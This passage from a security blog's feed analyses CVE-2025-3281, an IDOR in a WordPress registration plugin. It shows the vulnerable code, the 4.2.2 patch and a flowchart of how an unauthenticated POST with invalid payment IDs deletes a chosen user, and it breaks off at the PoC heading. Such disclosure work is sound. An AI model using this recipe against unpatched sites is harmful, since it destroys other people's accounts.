class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-92-unauthenticated-insecure-direct-object-reference-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin &amp;lt;= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3281 Analysis &amp; PoC</title>
      <link>http://localhost:1313/posts/2025-12-25-cve-2025-3281/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-25-cve-2025-3281/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;User Registration &amp;amp; Membership – Custom Registration Form, Login Form, and User Profile&lt;/strong&gt; plugin for WordPress contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to &lt;strong&gt;4.2.1&lt;/strong&gt;, within the &lt;code&gt;create_stripe_subscription()&lt;/code&gt; function, due to &lt;strong&gt;missing validation of the user-controlled &lt;code&gt;member_id&lt;/code&gt; parameter&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to &lt;strong&gt;delete arbitrary user accounts&lt;/strong&gt; created via this plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – User Registration&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;According to the CVE description, the vulnerability resides in the &lt;code&gt;create_stripe_subscription()&lt;/code&gt; function of the plugin. This function handles the creation of Stripe subscriptions for users after registration.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_stripe_subscription() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_membership_confirm_payment&amp;#39; );&#xA;    $customer_id       = isset( $_POST[&amp;#39;customer_id&amp;#39;] ) ? $_POST[&amp;#39;customer_id&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $payment_method_id = isset( $_POST[&amp;#39;payment_method_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;payment_method_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $member_id         = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) ); &#xA;&#xA;    $is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;    if ( ! $is_user_created ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid Request.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $stripe_service      = new StripeService();&#xA;    $form_response       = isset( $_POST[&amp;#39;form_response&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;form_response&amp;#39;] ), true ) : array();&#xA;    $stripe_subscription = $stripe_service-&amp;gt;create_subscription( $customer_id, $payment_method_id, $member_id );&#xA;&#xA;    if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;        wp_send_json_success( $stripe_subscription );&#xA;    } else {&#xA;        wp_delete_user( absint( $member_id ) );&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function performs a nonce check using &lt;code&gt;ur_membership_verify_nonce( &#39;ur_membership_confirm_payment&#39; );&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Searching for the keyword &lt;code&gt;ur_membership_confirm_payment&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;639&#34; width=&#34;1645&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The nonce is created with the key &lt;code&gt;_confirm_payment_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This key and value are included in the &lt;code&gt;/membership-registration/?&lt;/code&gt; endpoint.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#39; alt=&#34;Value&#34; height=&#34;442&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;At the beginning of the function, data is taken directly from &lt;code&gt;$_POST&lt;/code&gt;, including &lt;code&gt;customer_id&lt;/code&gt;, &lt;code&gt;payment_method_id&lt;/code&gt;, and especially &lt;code&gt;member_id&lt;/code&gt;, which is taken directly from the request without any ownership or permission validation.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member_id = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, the function checks whether the user associated with &lt;code&gt;member_id&lt;/code&gt; has the &lt;code&gt;urm_user_just_created&lt;/code&gt; meta key:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;if ( ! $is_user_created ) {&#xA;    wp_send_json_error( ... );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that as long as the user was created through the plugin’s registration flow, the condition passes — &lt;strong&gt;there is no check to ensure that the requester is authorized to act on that user&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Note: the user must be registered via the &lt;strong&gt;Registration&lt;/strong&gt; form at&#xA;&lt;a href=&#34;http://localhost/registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/registration/&lt;/a&gt;, not via &lt;strong&gt;Membership Registration&lt;/strong&gt; at&#xA;&lt;a href=&#34;http://localhost/membership-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/membership-registration/&lt;/a&gt;, for &lt;code&gt;$is_user_created&lt;/code&gt; to be valid.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Next, the function calls:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$stripe_subscription = $stripe_service-&amp;gt;create_subscription(&#xA;    $customer_id,&#xA;    $payment_method_id,&#xA;    $member_id&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The return value determines the next execution path. If &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; is &lt;code&gt;false&lt;/code&gt;, the following code deletes the user corresponding to &lt;code&gt;$member_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;    wp_send_json_success( $stripe_subscription );&#xA;} else {&#xA;    wp_delete_user( absint( $member_id ) );&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To force &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; to be &lt;code&gt;false&lt;/code&gt;, an attacker can &lt;strong&gt;omit or provide invalid values for &lt;code&gt;$customer_id&lt;/code&gt; and &lt;code&gt;$payment_method_id&lt;/code&gt;&lt;/strong&gt;, causing the subscription creation to fail and triggering the error branch.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;This leads to a severe &lt;strong&gt;IDOR (Insecure Direct Object Reference)&lt;/strong&gt; vulnerability, allowing arbitrary deletion of user accounts.&lt;/p&gt;&#xA;&lt;p&gt;The patch in version &lt;code&gt;4.2.2&lt;/code&gt; adds &lt;strong&gt;permission checks before performing operations on the user&lt;/strong&gt;, preventing IDOR:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $member_id ) ) {&#xA;&#x9;wp_send_json_error(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Before calling &lt;code&gt;$stripe_service-&amp;gt;create_subscription()&lt;/code&gt;, the function verifies whether the requester has permission to edit the user with &lt;code&gt;member_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If not, it returns an error and &lt;strong&gt;does not delete the user&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#39; alt=&#34;Diff&#34; height=&#34;847&#34; width=&#34;1795&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This ensures that only authorized users can trigger operations that lead to &lt;code&gt;wp_delete_user()&lt;/code&gt;, effectively closing the &lt;strong&gt;IDOR vulnerability&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The Membership feature is disabled by default. You must enable it at&#xA;&lt;a href=&#34;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registers multiple action hooks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;$ajax_events&lt;/code&gt; list, &lt;strong&gt;&lt;code&gt;create_stripe_subscription&lt;/code&gt;&lt;/strong&gt; is marked as &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means the plugin registers both:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_create_stripe_subscription&#xA;wp_ajax_nopriv_user_registration_membership_create_stripe_subscription&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → for authenticated users&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → for &lt;strong&gt;unauthenticated users&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Therefore, &lt;strong&gt;anyone can send a request to this endpoint&lt;/strong&gt;, including unauthenticated attackers. When the request is processed:&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;create_stripe_subscription&lt;/code&gt; action becomes an &lt;strong&gt;IDOR exploitation point&lt;/strong&gt;, allowing deletion of any user created via the plugin, even without authentication.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress routes request via wp_ajax_nopriv_*&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;create_stripe_subscription() executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Read POST parameters (member_id, customer_id, payment_method_id)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Check get_user_meta(member_id, &amp;#39;urm_user_just_created&amp;#39;)&amp;#34;]&#xA;&#xA;F --&amp;gt;|Not exists| G[&amp;#34;Request rejected&amp;#34;]&#xA;F --&amp;gt;|Exists| H[&amp;#34;Call create_subscription()&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;Stripe subscription valid?&amp;#34;}&#xA;&#xA;I --&amp;gt;|Yes| J[&amp;#34;Return success response&amp;#34;]&#xA;I --&amp;gt;|No| K[&amp;#34;wp_delete_user(member_id)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user deleted&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 